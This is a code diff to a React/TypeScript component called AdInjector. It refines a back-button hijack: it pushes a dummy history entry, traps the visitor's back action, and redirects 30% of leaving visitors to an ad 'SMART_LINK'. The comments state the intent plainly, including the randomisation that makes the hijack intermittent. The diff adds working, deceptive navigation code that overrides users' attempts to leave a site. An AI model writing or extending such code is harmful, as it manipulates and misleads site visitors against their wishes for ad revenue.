@@ -56,19 +56,34 @@ export function AdInjector() {
     const setupBackButtonHijack = () => {
       try {
         if (!window.sessionStorage.getItem('backButtonHijacked')) {
-          window.history.pushState({ hijacked: true }, '', window.location.href);
+          window.history.pushState({ hijacked: 'dummy' }, '', window.location.href);
           window.sessionStorage.setItem('backButtonHijacked', 'true');
+
+          const handlePopstate = (e: PopStateEvent) => {
+            // Ignore if we are just backing into the dummy state from a deeper SPA page
+            if (e.state && e.state.hijacked === 'dummy') {
+               return;
+            }
+
+            // We are going back PAST the dummy state, meaning they are trying to leave.
+            // Trigger the smart link intermittently (e.g., 30% of the time).
+            if (Math.random() < 0.3) {
+              window.location.replace(SMART_LINK);
+            } else {
+              // Don't show ad. Since we consumed their back action with our dummy state,
+              // we need one more history.back() to actually let them leave the site.
+              window.removeEventListener('popstate', handlePopstate);
+              window.history.back();
+            }
+          };
+
+          window.addEventListener('popstate', handlePopstate);
+          return () => window.removeEventListener('popstate', handlePopstate);
         }
-
-        const handlePopstate = () => {
-          window.location.replace(SMART_LINK);
-        };
-
-        window.addEventListener('popstate', handlePopstate);
-        return () => window.removeEventListener('popstate', handlePopstate);
       } catch (err) {
         return undefined;
       }
+      return undefined;
     };
 
     loadAds();
